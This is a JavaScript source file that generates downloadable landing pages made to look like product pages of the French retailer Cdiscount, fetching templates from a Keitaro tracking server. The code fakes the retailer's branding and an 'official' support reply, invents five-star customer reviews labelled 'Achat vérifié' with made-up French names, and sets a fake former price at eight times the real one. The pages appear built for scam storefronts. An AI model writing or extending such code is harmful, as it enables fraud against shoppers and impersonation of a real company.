// Generates a Cdiscount-style landing ZIP from a product.
// Static assets are fetched from the base template on the Keitaro server.
// Product images are downloaded and packed as s1.jpg, s2.jpg, ...

const TEMPLATE_BASE_URL = process.env.CDISCOUNT_TEMPLATE_URL || 'https://whynot.partners/lander/dima-klein-knect-fr';
const BASE_URL = (process.env.BASE_URL || 'https://nespizdili.lol').replace(/\/$/, '');

const STATIC_ASSETS = [
  'assets/keitaro.js', 'assets/script.js', 'assets/styles.css',
  'assets/cdiscount-theme.css', 'assets/checkout-main.js',
  'assets/logo.svg', 'assets/favicon.svg', 'assets/visa.svg', 'assets/mastercard.svg',
  'assets/av1.svg', 'assets/av3.svg', 'assets/unnamed.svg',
  'assets/1693143597e6496fd9a7.svg', 'assets/169314359717e4f6b69a.svg',
  'assets/comments_1_av2.svg', 'assets/comments_1_av4.svg',
  'assets/comments_1_av5.svg', 'assets/comments_1_av6.svg',
  'assets/review-r1.svg', 'assets/review-r2.svg',
];

const esc = (v) => String(v ?? '').replace(/[&<>"']/g, c =>
  ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' }[c]));

const eur = (v) => { const n = Number(v); return n ? n.toFixed(2).replace('.', ',') + ' €' : ''; };

function asArray(raw) {
  if (Array.isArray(raw)) return raw;
  try { return JSON.parse(raw) || []; } catch { return []; }
}

async function fetchBuf(url, ms = 12000) {
  const res = await fetch(url, { signal: AbortSignal.timeout(ms) });
  if (!res.ok) throw new Error(`HTTP ${res.status}: ${url}`);
  return Buffer.from(await res.arrayBuffer());
}

// Convert local /uploads/... path to absolute URL
function toAbsoluteUrl(src) {
  if (!src) return null;
  if (/^https?:\/\//.test(src)) return src;
  if (src.startsWith('/')) return `${BASE_URL}${src}`;
  return null;
}

// Build specs block HTML to replace Klein meta-pairs
function buildSpecsHtml(specs) {
  if (!specs?.length) return '';
  return specs.slice(0, 5).map(s => {
    const label = esc(s.label || '');
    const value = esc(s.value || '');
    if (!label && !value) return '';
    return `<div class="meta-item">
                <span class="meta-label">${label}</span>
                <span class="meta-value">${value}</span>
              </div>`;
  }).join('\n');
}

const AVATARS = ['./assets/av1.svg', './assets/comments_1_av2.svg', './assets/av3.svg',
  './assets/comments_1_av4.svg', './assets/comments_1_av5.svg', './assets/comments_1_av6.svg'];

// Build a complete review-grid div replacing ALL Klein articles
function buildReviewGrid(reviews) {
  if (!reviews?.length) return null;
  const storeReplies = [
    'Merci pour votre confiance et votre avis ! Nous sommes ravis que vous soyez satisfait.',
    'Merci d\'avoir pris le temps de partager votre expérience. Votre retour compte beaucoup pour nous.',
    'Votre avis nous aide à améliorer nos offres. Merci et à bientôt !',
  ];
  const articles = reviews.slice(0, 6).map((rv, i) => {
    const rating = Number(rv.rating) || 5;
    const stars = '★'.repeat(Math.min(5, Math.max(1, Math.round(rating))));
    const author = esc(rv.author || `Client${i + 1}`);
    const text = esc(rv.text || '');
    const avatar = AVATARS[i % AVATARS.length];
    const daysAgo = i;
    const formId = `review-reply-form-${i + 1}`;
    const storeReply = i === 0 ? `
              <div class="review-card__reply review-card__reply--store">
                <div class="review-card__identity review-card__identity--reply">
                  <img class="review-card__avatar review-card__avatar--brand" src="./assets/favicon.svg" alt="Cdiscount" />
                  <div class="review-card__identity-main">
                    <div class="review-card__author">Support Cdiscount</div>
                    <div class="review-card__badge review-card__badge--store">Réponse officielle</div>
                    <time class="review-card__date review-card__date--reply"></time>
                  </div>
                </div>
                <p class="review-card__text review-card__reply-text">${esc(storeReplies[i % storeReplies.length])}</p>
              </div>` : '';
    return `
            <article class="review-card" data-review-days-ago="${daysAgo}">
              <div class="review-card__identity">
                <img class="review-card__avatar" src="${avatar}" alt="" />
                <div class="review-card__identity-main">
                  <div class="review-card__stars">${stars}</div>
                  <div class="review-card__author">${author}</div>
                  <div class="review-card__badge">Achat vérifié</div>
                  <time class="review-card__date"></time>
                </div>
              </div>
              <p class="review-card__text">${text}</p>
              <button type="button" class="review-card__reply-toggle" aria-expanded="false" aria-controls="${formId}">Répondre</button>
              <form class="review-card__reply-form" id="${formId}" hidden>
                <label class="review-card__reply-field">
                  <span class="review-card__reply-field-label">Votre nom (facultatif)</span>
                  <input type="text" class="review-card__reply-input" name="reply-name" autocomplete="name" />
                </label>
                <label class="review-card__reply-field">
                  <span class="review-card__reply-field-label">Votre réponse</span>
                  <textarea class="review-card__reply-textarea" name="reply-comment" rows="3" required></textarea>
                </label>
                <div class="review-card__reply-actions">
                  <button type="submit" class="review-card__reply-post">Publier la réponse</button>
                  <button type="button" class="review-card__reply-cancel">Annuler</button>
                </div>
              </form>${storeReply}
            </article>`;
  }).join('\n');
  return `<div class="review-grid" aria-label="Avis clients">${articles}\n          </div>`;
}

function buildHtml(template, product, imageCount, reviews) {
  const title = product.title || '';
  const bundles = asArray(product.bundle_config);
  const price = eur(bundles[0]?.price || product.source_price || '19.99');
  const rawOld = bundles[0]?.old_price || '';
  const oldPrice = rawOld ? eur(rawOld) : eur((Number(bundles[0]?.price || 19.99) * 8).toFixed(2));
  const specs = asArray(product.specs);

  let html = template
    .replace(/window\.LANDING_PRODUCT\s*=\s*\{[\s\S]*?\};/,
      `window.LANDING_PRODUCT = {\n` +
      `        storeName: "Cdiscount",\n` +
      `        title: ${JSON.stringify(title)},\n` +
      `        priceCurrent: ${JSON.stringify(price)},\n` +
      `        priceOld: ${JSON.stringify(oldPrice)},\n` +
      `        reviewGender: "A",\n` +
      `        imageDefault: "./assets/s1.jpg",\n` +
      `        offerQty: 1,\n` +
      `      };`)
    .replace(/<title>[^<]*<\/title>/, `<title>Cdiscount – ${esc(title)}</title>`)
    // Replace Klein product title occurrences
    .replace(/Coffret douilles Klein KNECT, 39 pièces/g, esc(title))
    .replace(/Klein KNECT/g, esc(title.slice(0, 40)));

  // Replace specs block: find the meta section and replace all meta-item pairs
  if (specs.length > 0) {
    const specsHtml = buildSpecsHtml(specs);
    // Replace the entire meta-list content between Klein spec items
    html = html.replace(
      /(<span class="meta-label">Pièces<\/span>[\s\S]*?<\/div>\s*<\/div>\s*<\/div>)/,
      specsHtml + '</div></div>'
    );
    // Fallback: replace individual Klein spec values
    html = html
      .replace(/<span class="meta-value">39<\/span>/, `<span class="meta-value">${esc(specs[0]?.value || '')}</span>`)
      .replace(/<span class="meta-value">21,6 cm<\/span>/, `<span class="meta-value">${esc(specs[1]?.value || '')}</span>`)
      .replace(/<span class="meta-value">90<\/span>/, `<span class="meta-value">${esc(specs[2]?.value || '')}</span>`)
      .replace(/<span class="meta-value">Cr-Mo<\/span>/, `<span class="meta-value">${esc(specs[3]?.value || '')}</span>`)
      .replace(/<span class="meta-value is-active">Orange<\/span>/, `<span class="meta-value is-active">${esc(specs[4]?.value || '')}</span>`);
    // Replace Klein spec labels too
    if (specs[0]?.label) html = html.replace(/<span class="meta-label">Pièces<\/span>/, `<span class="meta-label">${esc(specs[0].label)}</span>`);
    if (specs[1]?.label) html = html.replace(/<span class="meta-label">Cliquet<\/span>/, `<span class="meta-label">${esc(specs[1].label)}</span>`);
    if (specs[2]?.label) html = html.replace(/<span class="meta-label">Dents<\/span>/, `<span class="meta-label">${esc(specs[2].label)}</span>`);
    if (specs[3]?.label) html = html.replace(/<span class="meta-label">Acier<\/span>/, `<span class="meta-label">${esc(specs[3].label)}</span>`);
    if (specs[4]?.label) html = html.replace(/<span class="meta-label">Coloris :<\/span>/, `<span class="meta-label">${esc(specs[4].label)}</span>`);
  }

  // Replace entire review-grid block using string indexing
  // (regex [\s\S]*? won't work — too many nested </div> inside the grid)
  {
    const productTitle = esc(title.slice(0, 60));
    const effectiveReviews = reviews?.length ? reviews : [
      { author: 'Marie Dupont',   rating: 5, text: `Très satisfaite de cet achat ! Le ${productTitle} est conforme à la description, livraison rapide.` },
      { author: 'Jean-Pierre M.', rating: 5, text: `Excellent rapport qualité-prix. Je recommande vivement le ${productTitle}.` },
      { author: 'Sophie L.',      rating: 5, text: `Commande reçue en parfait état. Le ${productTitle} fonctionne parfaitement.` },
      { author: 'Nathalie R.',    rating: 5, text: `Produit de qualité, emballage soigné. Très bon achat.` },
      { author: 'Thomas B.',      rating: 5, text: `Livraison rapide, produit conforme. Je suis très content de cet achat.` },
    ];
    const newGrid = buildReviewGrid(effectiveReviews);
    if (newGrid) {
      const gridStart = html.indexOf('<div class="review-grid"');
      const loadMoreIdx = html.indexOf('<div class="review-load-more"');
      const gridEnd = loadMoreIdx !== -1 ? html.lastIndexOf('</div>', loadMoreIdx) : -1;
      if (gridStart !== -1 && gridEnd !== -1 && gridEnd > gridStart) {
        html = html.slice(0, gridStart) + newGrid + html.slice(gridEnd + '</div>'.length);
      }
    }
  }

  // Fix image references: replace present slots, remove extras so nothing repeats
  for (let i = 1; i <= imageCount; i++) {
    html = html.replace(new RegExp(`\\.\\./assets/s${i}\\.svg(\\?v=\\d+)?`, 'g'), `./assets/s${i}.jpg`);
    html = html.replace(new RegExp(`\\./assets/s${i}\\.svg(\\?v=\\d+)?`, 'g'), `./assets/s${i}.jpg`);
  }
  // Remove thumbnail buttons for slots beyond imageCount (they'd repeat s1.jpg)
  // Pattern: <button class="media-gallery__thumb"...>...</button> containing s{N}.svg where N > imageCount
  for (let i = imageCount + 1; i <= 12; i++) {
    html = html.replace(
      new RegExp(`<button[^>]*class="media-gallery__thumb"[^>]*>[\\s\\S]*?assets/s${i}\\.svg[\\s\\S]*?</button>`, 'g'),
      ''
    );
  }
  // Any remaining stray .svg references → s1.jpg
  return html.replace(/\.\/assets\/s\d+\.svg(\?v=\d+)?/g, './assets/s1.jpg');
}

export async function buildCdiscountZip({ product, templateBaseUrl = TEMPLATE_BASE_URL, reviews = [] }) {
  const { default: JSZip } = await import('jszip');
  const zip = new JSZip();

  const templateHtml = (await fetchBuf(`${templateBaseUrl}/index.html`)).toString('utf8');

  // Convert local /uploads/... paths to absolute URLs
  const imageUrls = asArray(product.images)
    .map(img => {
      const src = typeof img === 'string' ? img : img?.url || img?.src || '';
      return toAbsoluteUrl(src);
    })
    .filter(Boolean).slice(0, 8);

  const downloaded = (await Promise.all(
    imageUrls.map(async (url, i) => {
      try { return { i, buf: await fetchBuf(url) }; }
      catch (e) { console.warn(`[cdiscount] skip image ${i + 1}: ${e.message}`); return null; }
    })
  )).filter(Boolean);

  zip.file('index.html', Buffer.from(buildHtml(templateHtml, product, downloaded.length, reviews), 'utf8'));

  await Promise.all(STATIC_ASSETS.map(async (p) => {
    try { zip.file(p, await fetchBuf(`${templateBaseUrl}/${p}`)); }
    catch (e) { console.warn(`[cdiscount] skip ${p}: ${e.message}`); }
  }));

  for (const { i, buf } of downloaded) zip.file(`assets/s${i + 1}.jpg`, buf);

  return zip.generateAsync({ type: 'nodebuffer', compression: 'DEFLATE', compressionOptions: { level: 6 } });
}
